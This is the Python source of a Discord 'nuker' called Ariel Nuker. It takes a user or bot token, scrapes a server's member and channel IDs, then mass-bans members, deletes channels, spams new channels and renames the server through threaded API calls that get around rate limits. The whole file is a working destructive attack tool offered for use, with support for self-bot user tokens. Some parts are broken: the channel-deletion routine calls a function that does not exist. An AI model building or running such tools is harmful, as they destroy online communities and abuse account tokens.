import discord
from discord.ext import commands, tasks
import time
import requests
import asyncio
import json
import random
import os
from os import system, name
import colored
from colored import fg, attr
from pypresence import Presence
import threading

class colors:

  main = fg('#00fefc')
  reset = attr('reset')

os.system(f'cls & title [Ariel Nuker] - Configuration')

token = input(f'{colors.main}> {colors.reset}Token{colors.main}:{colors.reset} ')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"


token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")



class Ariel:

  
 async def Scrape():
        guild = input(f"{colors.main}>{colors.reset} Guild ID{colors.main}:{colors.reset} ")
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        #try:
        os.remove("Scraped/members.txt")
        os.remove("Scraped/channels.txt")
        #except:
            #pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{colors.reset}[{colors.main}+{colors.reset}] Scraped {colors.main}{membercount}{colors.reset} Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{colors.reset}[{colors.main}+{colors.reset}] Scraped {colors.main}{channelcount}{colors.reset} Channels")
            c.close()
 
 def channeldfunction(guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"waylons a skid")
                    break
                else:
                    break


 async def DChan():
        guild = input(f"{colors.main}>{colors.reset} Guild ID{colors.main}:{colors.reset} ")
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=Ariel.DChanFunction, args=(guild, channel,)).start()
        channels.close()
 
 def CChanFunction(guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[{colors.main}+{colors.reset}] {colors.main}Created Channel{colors.reset} {name}")
                    break
                else:
                    break

 def BanFunction(guild, member):
   while True:
     r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
     if 'retry_after' in r.text:
         time.sleep(r.json()['retry_after'])
     else:
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
           print(f"[{colors.main}-{colors.reset}] {colors.main}Banned {colors.reset}{member.strip()}")
           break
        else:
          break

 async def Ban():
   guild = input(f"{colors.main}>{colors.reset} Guild ID{colors.main}:{colors.reset} ")
   print()
   members = open('Scraped/members.txt')
   for member in members:
      threading.Thread(target=Ariel.BanFunction, args=(guild, member)).start()
      threading.Thread(target=Ariel.BanFunction, args=(guild, member)).start()
   members.close()

 async def CChan():
  guild = input(f"{colors.main}>{colors.reset} Guild ID{colors.main}:{colors.reset} ")
  name = input(f"{colors.main}>{colors.reset} Channel Name{colors.main}:{colors.reset} ")
  amount = input(f"{colors.main}>{colors.reset} Amount{colors.main}:{colors.reset} ")
  print()
  for i in range(int(amount)):
    threading.Thread(target=Ariel.CChanFunction, args=(guild, name,)).start()

 def GuildFunction(guild, name):
   while True:
     json = {'name': name}
     r = requests.patch(f"https://discord.com/api/v8/guilds/{guild}", headers=headers, json=json)
     if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
     else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[{colors.main}+{colors.reset}] {colors.main}Changed Guild Name{colors.reset} {name}")
                    break
                else:
                    break
       
 async def Guild():
   guild = input(f"{colors.main}>{colors.reset} Guild ID{colors.main}:{colors.reset} ")
   name = input(f"{colors.main}>{colors.reset} Guild Name{colors.main}:{colors.reset} ")
   print()
   threading.Thread(target=Ariel.GuildFunction, args=(guild, name)).start()



 async def Menu():
  os.system(f'cls & title [Ariel Nuker] - Connected: {client.user}')
  print(f'''
                            ______   _______   ______  ________  __       
                           /      \ |       \ |      \|        \|  \      
                          |  $$$$$$\| $$$$$$$\ \$$$$$$| $$$$$$$$| $$      
                          | $$__| $$| $$__| $$  | $$  | $$__    | $$      
                          | $$    $$| $$    $$  | $$  | $$  \   | $$      
                          | $$$$$$$$| $$$$$$$\  | $$  | $$$$$   | $$      
                          | $$  | $$| $$  | $$ _| $$_ | $$_____ | $$_____ 
                          | $$  | $$| $$  | $$|   $$ \| $$     \| $$     \\
                           \$$   \$$ \$$   \$$ \$$$$$$ \$$$$$$$$ \$$$$$$$$ 

                    ┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓
                    ┋ [{colors.main}B{colors.reset}] Ban Members             ┋  [{colors.main}S{colors.reset}] Scrape                 ┋ 
                    ┋ [{colors.main}D{colors.reset}] Delete Channels         ┋  [{colors.main}G{colors.reset}] Change Guild Name      ┋
                    ┋ [{colors.main}C{colors.reset}] Create Channels         ┋  [{colors.main}X{colors.reset}] Exit                   ┋
                    ┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┻┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛{colors.reset}                 
                                      [{colors.main}Credits{colors.reset}: Waylon {colors.main}&{colors.reset} Mike]   
'''.replace("$", f"{colors.main}${colors.reset}").replace("┅", f"{colors.main}┅{colors.reset}").replace("┋", f"{colors.main}┋{colors.reset}"))
  option=input(f"{colors.main}>{colors.reset} Action{colors.main}:{colors.reset} ")
  if option == 'B' or option == 'b':
     await Ariel.Ban() 
     time.sleep(2)
     await Ariel.Menu()
  elif option == 'D' or option == 'd':
     await Ariel.DChan()
     time.sleep(2)
     await Ariel.Menu()
  elif option == 'C' or option == 'c':
     await Ariel.CChan()
     time.sleep(2)
     await Ariel.Menu()
  elif option == 'S' or option == 's':
     await Ariel.Scrape()
     time.sleep(2)
     await Ariel.Menu()
  elif option == 'G' or option == 'g':
     await Ariel.Guild()
     time.sleep(2)
     await Ariel.Menu()
  elif option == 'X' or option == 'x':
     os._exit(0)


 def Startup():
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{colors.main}> {colors.reset}Token Not Valid')
            input()
            os._exit(0)

 @client.event
 async def on_ready():
    await Ariel.Menu()


if __name__ == "__main__":
    Ariel.Startup()
